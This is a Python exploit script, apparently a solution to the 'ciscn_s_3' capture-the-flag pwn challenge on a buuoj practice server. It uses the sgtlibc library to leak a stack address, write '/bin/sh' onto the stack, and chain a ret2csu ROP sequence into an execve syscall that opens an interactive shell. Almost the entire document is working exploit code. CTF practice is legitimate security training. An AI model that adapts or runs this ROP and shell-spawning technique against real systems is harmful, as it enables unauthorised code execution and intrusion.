import sgtlibc
from sgtlibc.gamebox import *
set_config(GameBoxConfig(
    is_local=False,
    file='./ciscn_s_3',
    remote='node4.buuoj.cn:27720',
    auto_load=True,
    auto_show_rop=True,
    auto_show_summary=True,
    auto_start_game=True,
    auto_load_shell_str=True,
    auto_show_symbols=True
))

s = sgtlibc.Searcher()
elf = client.elf

main_addr = elf.symbols['main']
csu_init_addr = elf.symbols['__libc_csu_init']

ret_addr = 0x004003a9
rax_59_ret = 0x04004E2
syscall = 0x0400517
payload = b'/bin/sh\x00' + fakeebp() + p00(main_addr)
pause()
sl(payload)
rc(0x20)  # buf size
stack_addr = u00(rc(6))  # leak current ebp
binsh_addr = stack_addr - 0x138 # 线上则是0x138
# binsh_addr = stack_addr - 0x148  # 本地运行需要 -0x148
rax_59 = binsh_addr + 0x10
pop_rdi = 0x04005a3
log.info(f'stack_addr:{hex(stack_addr)}')
log.info(f'binsh_addr:{hex(binsh_addr)}')
log.info(f'rax_59:{hex(rax_59)}')

payload = b'/bin/sh\x00' + fakeebp() + p00(rax_59_ret)
payload += gadgets.build('gadget_by_csu', csu_init_addr, rax_59, 0, 0, 0)
payload += p00(pop_rdi)
payload += p00(binsh_addr)
payload += p00(syscall)
sl(payload)
interactive()
